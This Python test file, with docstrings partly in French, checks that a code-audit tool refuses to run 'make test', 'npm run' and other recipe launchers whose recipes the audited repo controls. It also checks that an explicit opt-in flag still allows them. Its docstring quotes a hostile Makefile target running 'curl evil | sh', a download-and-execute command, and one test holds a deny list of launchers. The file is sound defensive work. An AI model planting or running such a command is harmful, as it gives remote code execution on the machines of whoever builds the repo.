"""F-005 — run_checks.py must refuse launchers whose recipe lives in the audited repo.

``make test`` (like ``npm run``, ``cargo build``, ``gradle``, ``dotnet``, ...) needs no
shell metacharacter: the Makefile of the audited repo is itself the payload. A hostile
repo ships a Makefile whose ``test`` target runs ``curl evil | sh``; once the command is
``confirmed`` in fix_plan.json (or ``--allow-unconfirmed`` is passed), run_checks executes
it verbatim — an RCE with a spotless command line. The whitelist must keep only direct,
recipe-free tool invocations (pytest, ruff, mypy, ...) and refuse recipe launchers by
default; a human may explicitly opt in with ``--allow-recipe-run``.
"""
import argparse
import contextlib
import importlib.util
import json
import os
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
RUN_CHECKS_SCRIPT = REPO_ROOT / "code-audit-skills/code-audit-fixer/scripts/run_checks.py"
FIXPLAN_SCRIPT = REPO_ROOT / "code-audit-skills/code-audit-fixer/scripts/fixplan.py"

os.environ["PATH"] = str(REPO_ROOT / ".venv/bin") + os.pathsep + os.environ.get("PATH", "")


def _load(script, name):
    spec = importlib.util.spec_from_file_location(name, script)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def _hostile_repo(tmp_path):
    """Un dépôt factice dont le Makefile exécute une commande arbitraire (crée un marqueur)."""
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "Makefile").write_text("test:\n\t@touch marker.txt\n", encoding="utf-8")
    return repo


def _plan(tmp_path, cmd, confirmed):
    plan = tmp_path / "plan.json"
    plan.write_text(json.dumps(
        {"commands": {"test": [{"cmd": cmd, "source": "Makefile", "trusted": True, "confirmed": confirmed}]}},
        ensure_ascii=False), encoding="utf-8")
    return plan


def _run_checks(mod, repo, plan_path, out, extra_args):
    argv = ["run_checks.py", "--repo", str(repo), "--plan", str(plan_path),
            "--label", "f005", "--kinds", "test", "--out", str(out)] + extra_args
    old = sys.argv
    sys.argv = argv
    try:
        with contextlib.suppress(SystemExit):
            mod.main()
    finally:
        sys.argv = old
    return json.loads((out / "f005.json").read_text(encoding="utf-8"))


def test_confirmed_make_test_recipe_is_not_executed(tmp_path):
    """`make test` confirmed : run_checks refuse, la recette du Makefile ne tourne pas.

    Échoue avant le correctif : run_checks exécute la recette hostile → marker.txt créé.
    """
    rc = _load(RUN_CHECKS_SCRIPT, "run_checks_F005")
    repo = _hostile_repo(tmp_path)
    plan_path = _plan(tmp_path, "make test", confirmed=True)

    doc = _run_checks(rc, repo, plan_path, tmp_path / "out", [])

    r = doc["results"][0]
    assert r["refused"], f"make test aurait dû être refusé : {r}"
    assert not (repo / "marker.txt").exists(), "la recette hostile a été exécutée"


def test_allow_unconfirmed_still_refuses_recipe(tmp_path):
    """`--allow-unconfirmed` ne lève pas le refus : la recette du dépôt ne tourne toujours pas."""
    rc = _load(RUN_CHECKS_SCRIPT, "run_checks_F005")
    repo = _hostile_repo(tmp_path)
    plan_path = _plan(tmp_path, "make test", confirmed=False)

    doc = _run_checks(rc, repo, plan_path, tmp_path / "out", ["--allow-unconfirmed"])

    r = doc["results"][0]
    assert r["refused"], f"--allow-unconfirmed ne doit pas exécuter make test : {r}"
    assert not (repo / "marker.txt").exists()


def test_allow_recipe_run_is_an_explicit_opt_in(tmp_path):
    """`--allow-recipe-run` est la seule porte : avec le drapeau, l'exécution est assumée."""
    rc = _load(RUN_CHECKS_SCRIPT, "run_checks_F005")
    repo = _hostile_repo(tmp_path)
    plan_path = _plan(tmp_path, "make test", confirmed=True)

    doc = _run_checks(rc, repo, plan_path, tmp_path / "out", ["--allow-recipe-run"])

    r = doc["results"][0]
    assert r["exit_code"] == 0, r
    assert (repo / "marker.txt").exists(), "--allow-recipe-run devrait exécuter la recette"
    assert r.get("recipe_run") is True, f"l'exécution de recette doit être signalée : {r}"


def test_pytest_and_ruff_still_allowed(tmp_path):
    """Les commandes directes sûres restent autorisées et s'exécutent (aucune sur-correction)."""
    rc = _load(RUN_CHECKS_SCRIPT, "run_checks_F005")
    assert rc.ALLOWED.match("pytest -q")
    assert rc.ALLOWED.match("ruff check app tests")
    assert rc.ALLOWED.match("python3 -m pytest -q")

    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "test_demo.py").write_text("def test_ok():\n    assert True\n", encoding="utf-8")
    plan_path = _plan(tmp_path, "pytest -q", confirmed=True)

    doc = _run_checks(rc, repo, plan_path, tmp_path / "out", [])

    r = doc["results"][0]
    assert r["exit_code"] == 0, r
    assert r["failed_tests"] == []


def test_recipe_launchers_removed_from_whitelist():
    """Aucun lanceur dont la recette est contrôlée par le dépôt ne reste dans ALLOWED."""
    rc = _load(RUN_CHECKS_SCRIPT, "run_checks_F005")
    for cmd in ("make test", "make build", "npm test", "npm run build", "pnpm test", "yarn test",
                "bun run test", "cargo test", "cargo build", "gradle test", "./gradlew test",
                "dotnet test", "composer test", "bundle exec rspec", "vendor/bin/phpunit",
                "tox", "nox", "mvn test"):
        assert not rc.ALLOWED.match(cmd), f"recette encore autorisée : {cmd}"


def test_cmd_confirm_refuses_recipe_command(tmp_path, capsys):
    """fixplan.cmd_confirm ne confirme pas une commande hors liste blanche."""
    fp = _load(FIXPLAN_SCRIPT, "fixplan_F005")
    plan_path = tmp_path / "fix_plan.json"
    plan_path.write_text(json.dumps(
        {"meta": {"base_commit": "t"}, "tasks": [], "commands": {}}, ensure_ascii=False), encoding="utf-8")

    a = argparse.Namespace(plan=str(plan_path), cmd="make test", kind="test")
    with pytest.raises(SystemExit):
        fp.cmd_confirm(a)

    saved = json.loads(plan_path.read_text(encoding="utf-8"))
    assert saved.get("commands", {}).get("test") in (None, []), "make test ne doit pas être confirmé"


def test_cmd_confirm_accepts_safe_command(tmp_path):
    """Une commande directe sûre reste confirmable (aucune sur-correction côté fixplan)."""
    fp = _load(FIXPLAN_SCRIPT, "fixplan_F005")
    plan_path = tmp_path / "fix_plan.json"
    plan_path.write_text(json.dumps(
        {"meta": {"base_commit": "t"}, "tasks": [], "commands": {}}, ensure_ascii=False), encoding="utf-8")

    a = argparse.Namespace(plan=str(plan_path), cmd="pytest -q", kind="test")
    fp.cmd_confirm(a)

    saved = json.loads(plan_path.read_text(encoding="utf-8"))
    assert saved["commands"]["test"][0]["cmd"] == "pytest -q"
    assert saved["commands"]["test"][0]["confirmed"] is True
